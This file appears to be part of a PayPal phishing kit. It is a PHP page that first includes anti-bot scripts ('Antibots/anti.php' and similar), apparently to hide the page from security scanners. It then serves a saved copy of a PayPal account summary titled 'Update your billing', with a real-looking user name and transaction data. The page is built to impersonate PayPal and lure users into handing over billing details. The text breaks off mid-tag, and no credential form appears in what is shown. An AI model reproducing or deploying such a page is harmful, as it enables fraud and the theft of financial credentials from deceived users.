<?php
include 'bots.php';
include './Antibots/bots.php';
include './Antibots/anti.php';
?>
<!DOCTYPE html>
<html dir="ltr" class="js" lang="en_US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript" src="./PayPal_ Summary1_files/customer.js.download" async=""></script><script type="text/javascript" src="./PayPal_ Summary1_files/customer.js(1).download" async=""></script><script type="text/javascript" src="./PayPal_ Summary1_files/customer.js(2).download" async=""></script><script src="./PayPal_ Summary1_files/802b93f0fe41b41869a2e449e704709d.js.download"></script><script src="./PayPal_ Summary1_files/b79c96676bd3fd6279f06cb12be72a32.js.download"></script><script src="./PayPal_ Summary1_files/f963fe97436ac0435796c1a8b06428b0.js.download"></script><script src="./PayPal_ Summary1_files/99bcddfb8aa04c3526d928f1ae21749d.js.download"></script><!--Script info: script: node, template:  , date: Nov 19, 2016 18:02:58 -08:00, country: US, language: en web version:  content version:  hostname : TIg6NMXNPfHKJCp0pjUGMRV5YaaVc73hp1a99A2gPn7kuC5R7jkFaE1mnvPPZcEM rlogid : GBuHKhnr0kktkGV1HgQNR%2FzcOvVzt4XxlbCcGg0uwMr4WLVRIB%2FOXhAwfwXpwPAMzJa8QHogN6Yw42RTbI9GVA_1587f78e0f9 --><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"><link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png"><link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png"><link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png"><link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png"><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"><title>Update your billing </title><link rel="stylesheet" href="./PayPal_ Summary1_files/app.css"><link rel="stylesheet" href="./PayPal_ Summary1_files/paypal-sans.css"><link rel="stylesheet" href="./PayPal_ Summary1_files/summary.css"><script type="text/javascript" async="" src="./PayPal_ Summary1_files/a9c4aeff86b95c5cb3349adbbdf3698b.js.download"></script><script type="text/javascript" src="./PayPal_ Summary1_files/customer.js(3).download" async=""></script><script>document.documentElement.className = "js";</script><script>if (!window.Intl) { document.write('<script src="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/lib/shim/Intl.min.js"><\/script>'); }</script><!--[if lt IE 9]><script>(function (a) {var b = ('section,article,aside,hgroup,header,footer,nav,figure,figcaption,video,audio,track,embed,mark,progress,' +'meter,time,data,ruby,rt,rp,bdi,wbr,canvas,command,details,datalist,keygen,output').split(','), c = b.length;while (c) { a(b[c-=1]); }}(document.createElement));</script><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/css/ie.ltr.css" /><script src="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/lib/shim/es5.min.js"></script><![endif]--><script type="text/javascript" charset="utf-8" async="" src="./PayPal_ Summary1_files/3.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js" src="./PayPal_ Summary1_files/ajaxError.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js" src="./PayPal_ Summary1_files/dust-templates.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/locales/US/en/languagepack.js" src="./PayPal_ Summary1_files/languagepack.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/overpanel.js" src="./PayPal_ Summary1_files/overpanel.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js" src="./PayPal_ Summary1_files/ajaxError.js(1).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js" src="./PayPal_ Summary1_files/dust-templates.js(1).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/locales/US/en/languagepack.js" src="./PayPal_ Summary1_files/languagepack.js(1).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js" src="./PayPal_ Summary1_files/ajaxError.js(2).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js" src="./PayPal_ Summary1_files/dust-templates.js(2).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/locales/US/en/languagepack.js" src="./PayPal_ Summary1_files/languagepack.js(2).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js" src="./PayPal_ Summary1_files/ajaxError.js(3).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js" src="./PayPal_ Summary1_files/dust-templates.js(3).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/locales/US/en/languagepack.js" src="./PayPal_ Summary1_files/languagepack.js(3).download"></script><link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="./PayPal_ Summary1_files/default.css"></head><body data-iswireless="" data-istablet="" data-view-name="summary/index" data-js-path="https://www.paypalobjects.com/web/res/ data-genericerror="Please try again." data-rlogid="GBuHKhnr0kktkGV1HgQNR%2FzcOvVzt4XxlbCcGg0uwMr4WLVRIB%2FOXhAwfwXpwPAMzJa8QHogN6Yw42RTbI9GVA_1587f78e0f9" data-hostname="TIg6NMXNPfHKJCp0pjUGMRV5YaaVc73hp1a99A2gPn7kuC5R7jkFaE1mnvPPZcEM" data-cobrowser="{&quot;serverHostUrl&quot;:&quot;https://cb.paypal.com&quot;,&quot;assetHostUrl&quot;:&quot;https://www.paypalobjects.com/cobrowsingApp&quot;,&quot;customerJS&quot;:&quot;https://www.paypalobjects.com/cobrowsingApp/scripts/final/customer.js&quot;,&quot;token&quot;:&quot;560e0640c4038e043ba6770b&quot;}" class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony US"><!--[if lte IE 10]><div class="banner-notification--container js_banner-notification--container nemo_banner-notification--container"><div class="banner-notification--content js_banner-notification--content"><div class="banner-notification--table js_banner-notification--table"><p>Your browser is out of date. Get the latest version to see all your account features.</p></div></div></div><![endif]--><div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning=""><div class="vx_globalNav-container"><a href="####" class="vx_globalNav-brand_desktop"><span class="vx_a11yText">Summary</span></a><div class="vx_globalNav-secondaryNav_mobile noPrint"><div class="vx_globalNav-listItem_mobileLogout"><a href="####logout" class="vx_globalNav-link_mobileLogout">Log Out</a></div><div class="vx_globalNav-listItem_settings"><a href="####settings" class="vx_globalNav-link_settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_a11yText">Settings</span></a></div><div><p class="vx_h5 vx_globalNav-displayName">Kayli Mangus</p><!-- Profile photo markup goes here. --></div></div><div class="vx_globalNav-navContainer noPrint"><nav id="navMenu" class="vx_globalNav-nav" role="navigation"><ul class="vx_globalNav-list"><li><a href="####" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> <span class="vx_globalNav-navText">Summary</span></a></li><li><a href="####activity" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">Activity</span></a></li><li id="js_tourSendMoney"><a href="####transfer" class=" vx_globalNav-links nemo_globalNavTransferLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span></span> <span class="vx_globalNav-navText">Send &amp; Request</span></a></li><li id="js_tourWallet"><a href="####wallet" class=" vx_globalNav-links nemo_globalNavWalletLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span></span> <span class="vx_globalNav-navText">Wallet</span></a></li><li><a href="##/deals" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span></span> <span class="vx_globalNav-navText">Shop</span></a></li><li class="globalNav-listItem_mobile js_globalNavSearch"><a href="##/selfhelp/paypalsearch" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink"><span class="vx_globalNav-navText">Search</span></a></li></ul><ul class="vx_globalNav-list_secondary"><li class="js_globalNavSearch"><a href="##/selfhelp/paypalsearch" class="vx_globalNav-link_iconOnly js_globalNavSearchLink" name="search" title="Search"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSearch"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Search</span></a></li><li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false"><a href="###" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount notificationLength-0 js_notificationCount">0</span></span><span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a></li><li id="js_tourSettings"><a href="####settings" class="vx_globalNav-link_settings" name="settings" title="Settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li><li class="globalNav-listItem_mobile"><a href="##/us/cgi-bin/webscr?cmd=_help" class="vx_globalNav-link_help" name="help"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li><li class="vx_globalNav-listItem_logout"><a href="####logout" class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li></ul></nav></div></div></div><div id="sidepanelNotifications" class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel" tabindex="-1"><div class="vx_sidepanel-headerContainer"><h3 class="vx_h3 vx_sidepanel-header">Notifications</h3><div class="vx_sidepanel-headerIcon_right"><a href="###" class="globalNotifs-close js_closeNotifications" name="closeNotifications" role="button" data-pagename="main:walletweb:summary::closeNotifications"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="vx_a11yText">Close Notifications</span></a></div></div><div class="vx_sidepanel-body"><ul class="vx_sidepanel-list"><li class="globalNotifs-listItem globalNotifs-default-item"><p class="globalNotifs-smc-message ">View your messages</p><a href="##/selfhelp/smc/" class="globalNotifs-smc-message vx_sidepanel-messageButton">Go to Message Center</a></li><li class="globalNotifs-listItem globalNotifs-default-item">No Notifications</li></ul></div></div><div id="js_foreground" class="vx_foreground-container foreground-container"><div class="vx_globalNav-main_mobile js_globalNavView"><div class="vx_globalNav-headerSection_trigger"><a href="###navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">Menu</a></div><div class="vx_globalNav-headerSection_logo"><a href="####" class="vx_globalNav-brand_mobile"><span class="vx_a11yText">Summary</span></a></div><ul class="vx_globalNav-headerSection_actions"><li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false"><a href="###" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount notificationLength-0 js_notificationCount">0</span></span><span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a></li></ul></div><div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1"><div id="js_summaryView" class="mainContents summaryContainer" data-locality="{&quot;timezone&quot;:{&quot;determiner&quot;:&quot;viaUserProfile&quot;,&quot;value&quot;:&quot;America/Los_Angeles&quot;},&quot;country&quot;:&quot;US&quot;,&quot;locale&quot;:&quot;en_US&quot;,&quot;language&quot;:&quot;en&quot;,&quot;directionality&quot;:&quot;ltr&quot;,&quot;currencyFormat&quot;:{&quot;separator&quot;:&quot;,&quot;,&quot;decimal&quot;:&quot;.&quot;}}" data-transactions="[{&quot;id&quot;:&quot;8V770712CD130750H&quot;,&quot;extension&quot;:{&quot;internal_id&quot;:&quot;EkwIQZGV8_4PTMInog3dZfonoFH4iIKoL--QiwuuqaRX28brMeNn-PunPWK&quot;,&quot;group_request_id&quot;:null},&quot;filterSet&quot;:[&quot;PAYMENT_SENT&quot;],&quot;status&quot;:&quot;COMPLETED&quot;,&quot;displayStatus&quot;:&quot;&quot;,&quot;type&quot;:&quot;PAYMENT&quot;,&quot;isPrefetchable&quot;:true,&quot;subtype&quot;:&quot;PAYMENT&quot;,&quot;displayType&quot;:&quot;Payment&quot;,&quot;isCredit&quot;:false,&quot;isZeroNetAmount&quot;:false,&quot;counterparty&quot;:&quot;Sketchmob&quot;,&quot;hasDynamicType&quot;:false,&quot;hasDynamicCounterparty&quot;:false,&quot;amounts&quot; data-track-type=&#39;link&#39;&quot;,&quot;FIModule_linkCard&quot;:&quot;class=&#39;nemo_fiModule-actions nemo_fiModule-linkCard&#39;&quot;,&quot;FIModule_updateInWallet&quot;:&quot;class=&#39;nemo_fiModule-actions nemo_fiModule-updateInWallet&#39;&quot;,&quot;recentActivity_activityLink&quot;:&quot;class=&#39;nemo_recentActivity-activityLink&#39;&quot;,&quot;recentActivity_shopLink&quot;:&quot;class=&#39;nemo_recentActivity-shopLink&#39;&quot;}" data-liftwithdrawallimits="{&quot;bankData&quot;:{},&quot;cardData&quot;:{&quot;hasConfirmedCard&quot;:true},&quot;hasTaxId&quot;:false,&quot;remainingSteps&quot;:1}" data-first-use-data="" data-goalsdetails=""><h1 id="heading1" class="accessAid">PayPal: Summary</h1><div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges=""><div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger"><span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div><div class="engagementMainBar-container js_engagementMainBar-container"><div class="summarySection engagementMainBar row"><div class="col-sm-7 progressAndWelcome"><div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="60" data-hide-percent-animation=""><div id="js_outerCircle" class="outerCircle"><div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div><div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(36deg); -moz-transform: rotate(36deg); -ie-transform: rotate(36deg); -o-transform: rotate(36deg); transform: rotate(36deg);"></div></div></div><div id="js_innerCircle" class="innerCircle"><div class="profilePhotoTable"><div id="js_profilePhotoView" class="profilePhotoContainer hasFileReader" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{}" data-wurfl="{}"><span id="js_user_icon" class="profilePhotoIcon icon icon-profile-add-large" aria-hidden="true" data-hover-text="Add a photo"></span></a></div></div><div id="js_percentageContainer" class="percentageContainer nemo_percentageContainer"><div id="js_percentage" class="nemo_accountCompletionPercent fadeOut hide">60%</div></div></div></div><div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus animate" data-module-number="0"><p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">Hi again !</p><button id="js_engagementActionTrigger" class="vx_btn vx_btn-medium engagement-actionText vx-btn_toggleProfileStatus js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="profileStatusText">Get the most out of PayPal</span><span class="js_toggleProfile icon icon-small icon-arrow-down-small icon-small_toggleProfile nemo_profileStatusDownArrow" aria-hidden="true"></span></button></div></div><div id="js_engagementActions" class="col-sm-5 engagementActions"><ul class="actionsContainer nemo_actionsContainer"><li class="actionItem engagement-0-listItem"><a href="###" role="button" data-module-number="1" name="EM_SendMoney" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span>Pay or send money</span></a></li><li class="actionItem engagement-1-listItem"><a href="###" ##" role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="2" name="EM_DownloadApp" class="vx_small-text js_selectModule selectModule selectModule_app 	nemo_appSelect"><span class="icon icon-medium icon-phone" aria-hidden="true"></span>Get the PayPal app</a></li><li class="actionItem engagement-2-listItem"><a href="###" role="button" ##" name="EM_PPCredit" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="3" class="vx_small-text js_selectModule selectModule nemo_bmlSelect"><span class="icon icon-medium icon-calendar" aria-hidden="true"></span>Take more time to pay</a></li></ul></div></div></div><div id="js_emSlideDownContainer" aria-expanded="false" role="alertdialog" tabindex="-1" class="emSlideDownContainer module-0 nemo_emSlideDownContainer collapseEm hide" data-em-open="true" data-current-module="0" data-new-user="true" data-total-percentage="60" data-hide-sneak-peek="false" data-hide-account-completion="false" data-is-first-use-enabled="false" data-auto-open-offer="false" aria-label=""><div class="engagementSneakPeek-overlay js_engagementSneakPeek-overlay"></div><div id="aria_engagementStatus" data-engagement-stage="accountSetup" class="emModule dimBorderLine js_emModule engagementStatusModule js_engagementStatusModule nemo_engagementStatus" tabindex="-1"><div id="js_BadgeLanding" class="emModuleContent"><div id="profileStateContainer" class="setupbadgeBanner-container js_profileStates nemo_profileStates nemo_badges badgeDisplay"><div class="setupbadgeBanner-container badgeDisplay js_badgeDisplay js_badges js_badgeChild nemo_profileStates nemo_badges active"><p class="statusGreeting vx_h2">Power up more ways to use PayPal</p><div class="tour-container" id="js_tourModule"><button class="vx_btn vx_btn-secondary_reversed vx_btn-small btn-startTour js_tourStart nemo_startTour" name="QT_StartTour" data-pagename="main:walletweb:summary::QT_StartTour"><span class="tour-icon-play"><span class="tour-play-message">Start tour</span></span></button><div class="tourContent hide" id="js_tourContent"><p class="js_balanceModuleTitle">No PayPal balance? No problem!</p><p class="js_sendMoneyTitle">Want to pay or get paid?</p><p class="js_sendMoneyDescription">Need to send some birthday cash to your niece overseas? Hit your buddy up for that $20 he owes you? Let us show you how.</p><p class="js_walletTitle">Edit your ways to pay.</p><p class="js_walletDescription">Be sure to keep your Wallet up to date. A tidy Wallet makes it simple to pay without anyone seeing your financial info.</p><p class="js_settingsTitle">Update your account profile.</p><p class="js_settingsDescription">Something changed? No biggie! Update your profile, password, payment methods, notifications, and more right here.</p><p class="js_fiModule_noFI">Simply <a href="####wallet/add/card" target="_top" class="popover-link" name="QT_AddCard" data-pagename="main:walletweb:summary:home::QT_AddCard:">link a card.</a> You’ll be all set to instantly shop and spend.</p><p class="js_fiModule_FI">You’ve already linked a payment method. You’re ready to shop and send money.</p><p class="js_conlusionTitle">You’re all set!</p><p class="js_conclusionDescription">Now that we’ve covered the basics, have fun <a href="##/deals" target="_top" class="popover-link" name="QT_Shopping" data-pagename="main:walletweb:summary:home::QT_Shopping:">shopping,</a> <a href="####transfer" target="target=" _top"="" class="popover-link" name="QT_SendRequestLink" data-pagename="main:walletweb:summary:home::QT_SendRequestLink:">sending and requesting money</a>, and more.</p></div><div class="js_tourContainer hide"><div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div><div class="popover-navigation"><div class="btn-group"><button class="vx_btn vx_btn-medium vx_btn_reversed tour-btn nemo_next js_popover-next" data-role="next">Next</button><button class="vx_btn-link popover-link_endTour vx_text-body_secondary nemo_endTour popover-link js_popover-endLink" data-role="end">End tour</button></div></div></div></div></div><ul id="js_profileStates" class="profileStates nemo_profileStates"><li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Account created</span></li><li class="setupStep-state nemo_bank nemo_setup_button "><a href="####wallet/add/bank" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink isShown" name="EM_Bank_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="setupStep-container"><span class="icon icon-medium icon-bank-check setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContentContainer"><span class="setupStep-cta">Link a bank</span></span></span><span class="setupStep-overlayContainer"><span class="setupStep-overlayIconContainer"><span class="setupStep-overlayIconSubContainer  "><span class="setupStep-inlineIcon"><span class="icon icon-medium icon-bank-check"></span></span></span></span><span class="setupStep-overlayCtaContainer"><span class="setupStep-overlayCta">Link a bank</span><span class="setupStep-overlayContent">Send money to friends in the U.S. for free.</span></span></span></a></li><li class="setupStep-state nemo_email nemo_setup_button setupStep-doneState"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Email confirmed</span></li><li class="setupStep-state nemo_card nemo_setup_button setupStep-doneState"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Card linked</span></li><li class="setupStep-state nemo_mobile nemo_setup_button"><a href="####settings" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_Mobile_Confirmed" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="setupStep-container"><span class="icon icon-medium icon-phone setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContentContainer"><span class="setupStep-cta">Confirm mobile</span></span></span><span class="setupStep-overlayContainer"><span class="setupStep-overlayIconContainer"><span class="setupStep-overlayIconSubContainer  setupStep-overlayIconSubContainer_phone"><span class="setupStep-inlineIcon"><span class="icon icon-medium icon-phone"></span></span></span></span><span class="setupStep-overlayCtaContainer"><span class="setupStep-overlayCta">Confirm mobile</span><span class="setupStep-overlayContent">Extra protection for your account.</span></span></span></a></li></ul></div></div><a href="###" class="js_dismiss emClose emClose_acctCompletion nemo_emClose" role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" name="EM_BadgeSetup_Close"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div><div class="emModule js_emModule transferBannerContainer nemo_EM_SendMoneyBanner" data-is-sneak-peek-available="true" data-sneak-peek-texts="[&quot;Send money between friends. It’s free if you’re both in the U.S. and you use your bank or balance.&quot;, &quot;Send money to a friend, even if they’re not on PayPal yet.&quot;, &quot;Sending money is the simple way to pay someone back right away.&quot;]" data-sneak-peek-link-name="[&quot;SneakPeek_SendMoney_Free&quot;, &quot;SneakPeek_SendMoney_Unilateral&quot;, &quot;SneakPeek_SendMoney_Simple&quot;]" data-bg-img=""><div class="emModuleContent"><div class="engagementSneakPeek js_engagementSneakPeek hide"><button class="js_engagementSneakPeek-trigger engagementSneakPeek-trigger vx_btn-link" data-sneak-peek-click="" data-pagename="main:walletweb:summary::main" data-track-type="link" name=""><span class="engagementSneakPeek-content js_engagementSneakPeek-content small-text">Send money between friends. It’s free if you’re both in the U.S. and you use your bank or balance.</span></button></div><div class="mpiBannerContainer js_mpiBannerContainer transferBanner"><div class="row"><div class="col-xs-6 transferActionColumns"><a href="####transfer/buy" target="_top" class="nemo_primaryActionButton_transferBuy transferPrimaryActions" name="EM_BUY_CTA" data-pagename="main:walletweb:transfer:buy:start" data-pagename2="main:walletweb:transfer:buy:start:::" data-track-type="link"><span class="icon icon-register engagementAction-icon_transferDesktop" aria-hidden="true"></span><span class="transferPrimaryActionContent vx_h3">Pay for goods or services</span></a><p class="transferPrimaryActionBody"><span class="icon icon-shield engagementAction-icon_transfer-shield" aria-hidden="true"></span>Covered by <a href="##/us/webapps/mpp/paypal-safety-and-security" ##" class="transferSecondaryActionText nemo_secondaryAction_transferPurchaseProtection" name="emOfferTransferBuySecondaryAction" data-pagename="main:consumer:summary::main" data-pagename2="main:consumer:summary::main:::" data-track-type="link">PayPal Protection for buyers</a>.<br>Free for you. The seller pays a fee.</p></div><div class="col-xs-6 transferActionColumns"><a href="####transfer/send" target="_top" class="nemo_primaryActionButton_transferSend transferPrimaryActions" name="EM_Send_CTA" data-pagename="main:walletweb:transfer:send:start" data-pagename2="main:walletweb:transfer:send:start:::" data-track-type="link"><span class="icon icon-send-money engagementAction-icon_transferDesktop" aria-hidden="true"></span><span class="transferPrimaryActionContent vx_h3">Send money to friends and family</span></a><p class="transferPrimaryActionBody">It’s free in the U.S. when you use bank or balance.</p></div></div></div><a href="###" class="js_dismiss emClose nemo_emClose" role="button" name="EM_SendMoney_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div><div class="emModule  js_emModule nemo_EM_DownloadAppBanner" data-is-sneak-peek-available="" data-sneak-peek-texts="" data-sneak-peek-link-name="" data-bg-img="https://www.paypalobjects.com/webstatic/all-products/venice_bg.png" style="background: white url(&quot;https://www.paypalobjects.com/webstatic/all-products/venice_bg.png&quot;) no-repeat scroll center center / cover ;"><div class="emModuleContent js_emModuleContent"><div class="mpiBannerContainer js_mpiBannerContainer row"><div class="col-md-5"><img name="phoneImg" class="veniceBanner-foregroundImage" src="./PayPal_ Summary1_files/venice_US_img.png"></div><div class="mpiBanner mpi-right veniceBanner-container col-md-5"><div class="mpiTextContainer" style="color: #fff;"><h3 class="mpiHeader vx_h2" style="color: #fff;">Welcome to our New App</h3><ul class="veniceBanner-valueList"><li>Faster access to features</li><li>Send money in minutes</li><li>Manage your money easily</li></ul><div class="veniceBanner-appBtnContainer"><a href="https://app.adjust.com/fh6d4k?fallback=https%3A%2F%2Fitunes%2Eapple%2Ecom%2FWebObjects%2FMZStore%2Ewoa%2Fwa%2FviewSoftware%3Fid%3D283646709" ##" style="background-image: url(&#39;https://www.paypalobjects.com/webstatic/mktg/wright/icons/appbadges_1x_sprite.png&#39;);" class="veniceBanner-appBtn veniceBanner-appBtn_apple"><span class="accessAid">☃appVenice.downloadAppIOS☃</span></a><a href="https://app.adjust.com/l5x0vt?fallback=https%3A%2F%2Fplay%2Egoogle%2Ecom%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom%2Epaypal%2Eandroid%2Ep2pmobile%26referrer%3Dutm%5Ffiksu%5Fadid%253D187734%2526" ##" style="background-image: url(&#39;https://www.paypalobjects.com/webstatic/mktg/wright/icons/appbadges_1x_sprite.png&#39;);" class="veniceBanner-appBtn veniceBanner-appBtn_android"><span class="accessAid">☃appVenice.downloadAppAndroid☃</span></a></div></div></div></div><a href="###" class="js_dismiss emClose nemo_emClose" role="button" name="EM_DownloadApp_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="color: #fff;"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span 